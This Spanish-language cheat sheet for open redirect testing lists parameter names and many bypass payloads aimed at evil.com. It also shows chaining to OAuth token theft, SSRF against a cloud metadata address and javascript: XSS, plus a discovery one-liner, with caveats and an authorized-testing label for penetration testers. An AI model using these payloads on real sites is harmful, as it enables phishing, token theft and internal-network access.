# 🔀 Guía rápida de redirecciones abiertas

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 ¿Qué es una redirección abierta?

Una **redirección abierta** (open redirect) permite redirigir a los usuarios hacia sitios maliciosos mediante enlaces que comienzan en dominios de confianza. Puede facilitar el phishing y combinarse con otras vulnerabilidades.

---

## 🔍 Parámetros habituales

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payloads

### Básicos
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Sin protocolo explícito
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Uso del símbolo @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Variantes con barra invertida
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### Codificación URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Confusión de dominios
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Bytes nulos
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### Inyección CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Redirección mediante JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

> **Interpretación de payloads:** estas variantes son casos de prueba, no elusiones universales. Su efecto depende del parser, la normalización, las decodificaciones y el navegador. Un dominio como `evil.target.com` sigue siendo un subdominio de `target.com`; su utilidad depende del control real sobre ese host.

## 🛡️ Técnicas de elusión

### Si se comprueba una lista de permitidos
```
# Elusión mediante subdominios
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Elusión mediante rutas
https://target.com/https://evil.com
https://target.com//evil.com
```

### Si solo se permite HTTPS
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Variantes con localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Encadenamiento de redirecciones abiertas

### Robo de tokens OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Robar tokens OAuth
```

> **Matiz de OAuth:** modificar `redirect_uri` no demuestra robo de tokens por sí solo. Debe existir una validación defectuosa o un encadenamiento que permita entregar una credencial al destino controlado; los parámetros y el flujo OAuth determinan el resultado.

### Encadenamiento con SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

> **Matiz de SSRF:** enviar al navegador a una IP interna o de metadatos no constituye por sí mismo SSRF. Este encadenamiento exige que un componente del servidor siga la redirección y haga la petición desde su propio contexto de red.

### Encadenamiento con XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

> **Contexto de ejecución:** `javascript:` y `data:` dependen de cómo se utilice el destino. Los navegadores pueden bloquear esos esquemas en redirecciones HTTP; no todos los payloads producirán ejecución. CRLF implica además un fallo de tratamiento de cabeceras.

## 📊 Referencia rápida

| Tipo de payload | Ejemplo |
|--------------|---------|
| Básico | `//evil.com` |
| Símbolo @ | `https://target.com@evil.com` |
| Codificación | `https:%2f%2fevil.com` |
| Confusión de dominios | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Herramientas

```bash
# Patrones GF
gau target.com | gf redirect

# Pruebas manuales
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

> **Validación:** los patrones GF identifican candidatos. Comprueba el destino efectivo y, cuando corresponda, la cabecera `Location`; un parámetro llamado `url` o la aparición de un dominio en el cuerpo no prueban una redirección abierta. Véase la [explicación de PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected).

## 📚 Recursos

- [Redirecciones abiertas de PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 ¡Analiza y aprovecha las redirecciones!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
